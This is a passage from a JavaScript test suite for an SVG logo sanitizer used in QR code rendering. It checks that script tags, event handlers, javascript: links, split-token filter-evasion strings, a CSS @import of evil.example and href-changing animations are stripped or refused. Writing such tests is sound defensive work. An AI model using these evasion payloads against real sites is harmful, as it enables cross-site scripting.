      '<style> with url() or @import',
      'CDATA',
      'entity tricks',
      '<animate> / <set> changing href to javascript:',
      'namespace tricks',
    ]);
  });

  for (const group of Object.keys(ATTACKS)) {
    test(`${group}: blocked or harmless in the rendered QR code`, () => {
      let rendered = 0;
      for (const attack of cases.filter((c) => c.group === group)) {
        let output;
        try {
          output = render(attack.markup);
        } catch (err) {
          // Refusing the logo outright is a valid way to block it.
          assert.ok(err instanceof RangeError, `${attack.label}: unexpected ${err.name}: ${err.message}`);
          assert.match(err.message, /SVG/, attack.label);
          continue;
        }
        rendered++;
        assertInert(extractLogo(output, attack.label), attack, attack.label);
      }
      assert.ok(rendered > 0, `${group}: every payload was refused, the sanitizing path was never exercised`);
    });
  }

  test('what is not refused still renders the harmless part of the drawing', () => {
    const logo = extractLogo(render(svg('<script>alert(1)</script><circle cx="5" cy="5" r="5" fill="#00f" onclick="alert(2)"/>')), 'mixed');
    assert.match(logo, /^<svg xmlns="http:\/\/www\.w3\.org\/2000\/svg" xmlns:xlink="http:\/\/www\.w3\.org\/1999\/xlink" width="10" height="10" viewBox="0 0 10 10"><circle cx="5" cy="5" r="5" fill="#00f"\/><\/svg>$/);
  });
});

describe('sanitizeSvg hardening', () => {
  test('runs to a fixed point: sanitizing any output again changes nothing', () => {
    for (const attack of cases) {
      let first;
      try {
        first = sanitizeSvg(attack.markup);
      } catch {
        continue;
      }
      const again = sanitizeSvg(`<svg ${NS} ${XLINK}>${first.inner}</svg>`);
      assert.equal(again.inner, first.inner, attack.label);
    }
  });

  test('split-token tricks that only work against single-pass regex filters are refused', () => {
    for (const markup of [
      svg('<scr<script>ipt>alert(1)</scr</script>ipt>'),
      svg('<scr<script></script>ipt>alert(1)</script>'),
      svg('<circle r="5" on<script></script>load="alert(1)"/>'),
    ]) {
      assert.throws(() => sanitizeSvg(markup), RangeError);
    }
    assert.doesNotMatch(sanitizeSvg(svg('<circle r="5" ononloadload="alert(1)" oonloadnload="alert(2)"/>')).inner, /\son\w*=/i);
    assert.doesNotMatch(sanitizeSvg(svg('<style>@im@import x;port url(https://evil.example/a.css); a{fill:ururl(#x)l(https://evil.example/)}</style>')).inner, /@import|evil/i);
  });

  test('unquoted attributes are rejected', () => {
    for (const markup of [
      svg('<circle r=5/>'),
      svg('<circle r="5" onload=alert(1)/>'),
      svg('<a href=javascript:alert(1)><circle r="5"/></a>'),
      svg('<circle r="5" fill=`red`/>'),
      svg('<circle r="5" disabled/>'),
    ]) {
      assert.throws(() => sanitizeSvg(markup), /not a well-formed SVG/, markup);
    }
  });

  test('elements and attributes with a namespace prefix other than xlink: are removed', () => {
    const { inner } = sanitizeSvg(
      svg(
        '<g inkscape:label="Layer" xml:space="preserve" sodipodi:role="line" xlink:title="t">' +
          '<x:script>alert(1)</x:script><sodipodi:namedview pagecolor="#fff"><inkscape:grid type="xygrid"/></sodipodi:namedview>' +
          '<use xlink:href="#a"/><circle id="a" r="5"/></g>',
      ),
    );
    assert.equal(inner, '<g><use xlink:href="#a"/><circle id="a" r="5"/></g>');
  });

  test('<set> and <animate*> that target href are stripped; other animations stay', () => {
    const { inner } = sanitizeSvg(
      svg(
        '<a href="#x"><set attributeName="href" to="#y"/><animate attributeName="xlink:href" values="#a;#b"/>' +
          '<animateTransform attributeName="transform" type="rotate" from="0" to="360" dur="2s"/>' +
          '<animate attributeName="opacity" values="0;1" dur="1s"/><circle r="5"/></a>',
      ),
    );
    assert.equal(
      inner,
      '<a href="#x"><animateTransform attributeName="transform" type="rotate" from="0" to="360" dur="2s"/>' +
        '<animate attributeName="opacity" values="0;1" dur="1s"/><circle r="5"/></a>',
    );
  });

  test('the wrapper SVG declares xmlns:xlink so xlink:href stays well-formed', () => {
    const markup = embedSvgLogo(svg('<defs><circle id="a" r="5"/></defs><use xlink:href="#a"/>'), { x: 1, y: 2, w: 3, h: 4 });
    const logo = Buffer.from(/base64,([^"]+)"/.exec(markup)[1], 'base64').toString('utf8');
    assert.match(logo, /^<svg xmlns="http:\/\/www\.w3\.org\/2000\/svg" xmlns:xlink="http:\/\/www\.w3\.org\/1999\/xlink" /);
    assert.match(logo, /<use xlink:href="#a"\/>/);
  });

  test('malformed documents are refused instead of guessed at', () => {
    for (const markup of [
      svg('<g><circle r="5"/>'),
      svg('<g></circle>'),
      svg('<circle r="5" r="6"/>'),
      svg('<circle r="5"fill="red"/>'),
      svg('<circle title="a<b"/>'),
      svg('<text>a & b</text>'),
      svg('<text>&nbsp;</text>'),
      svg('<!-- never closed'),
      svg('<circle r="5"'),
      `<svg ${NS}>`,
      `<svg ${NS}></svg>trailing`,
      `${ESC}<svg ${NS}></svg>`,
    ]) {
      assert.throws(() => sanitizeSvg(markup), /SVG/, markup);
    }
  });

  test('a real-world style logo survives intact', () => {
    const logo = `<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!-- Created with a drawing tool -->
<svg ${NS} ${XLINK} xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape" width="64" height="32" viewBox="0 0 64 32" inkscape:version="1.3">
  <defs>
    <linearGradient id="grad" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#f00"/><stop offset="1" stop-color="#00f" stop-opacity=".5"/></linearGradient>
    <clipPath id="clip"><rect width="64" height="32" rx="4"/></clipPath>
    <style type="text/css"><![CDATA[ .a { fill: url(#grad); stroke: #000; } /* note */ .b > .c { opacity: .5 } ]]></style>
  </defs>
  <g clip-path="url(#clip)" style="stroke-width:2;fill:url('#grad')">
    <path class="a" d="M0 0h64v32H0z" transform="translate(1,2) scale(.9)"/>
    <text x="4" y="20" font-family="Helvetica, 'Arial', sans-serif">Q &amp; R &lt;3</text>
    <use xlink:href="#clip"/><image href="data:image/png;base64,iVBORw0KGgo=" width="4" height="4"/>
  </g>
</svg>
`;
    const result = sanitizeSvg(logo);
    assert.deepEqual(result.viewBox, [0, 0, 64, 32]);
    assert.equal(result.aspect, 2);
    assert.match(result.inner, /<linearGradient id="grad" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#f00"\/>/);
    assert.match(result.inner, /<style type="text\/css"> \.a \{ fill: url\(#grad\); stroke: #000; \} {3}\.b &gt; \.c \{ opacity: \.5 \} <\/style>/);
    assert.match(result.inner, /<g clip-path="url\(#clip\)" style="stroke-width:2;fill:url\(#grad\)">/);
    assert.match(result.inner, /<path class="a" d="M0 0h64v32H0z" transform="translate\(1,2\) scale\(\.9\)"\/>/);
    assert.match(result.inner, /<text x="4" y="20" font-family="Helvetica, 'Arial', sans-serif">Q &amp; R &lt;3<\/text>/);
    assert.match(result.inner, /<use xlink:href="#clip"\/><image href="data:image\/png;base64,iVBORw0KGgo=" width="4" height="4"\/>/);
  });
});
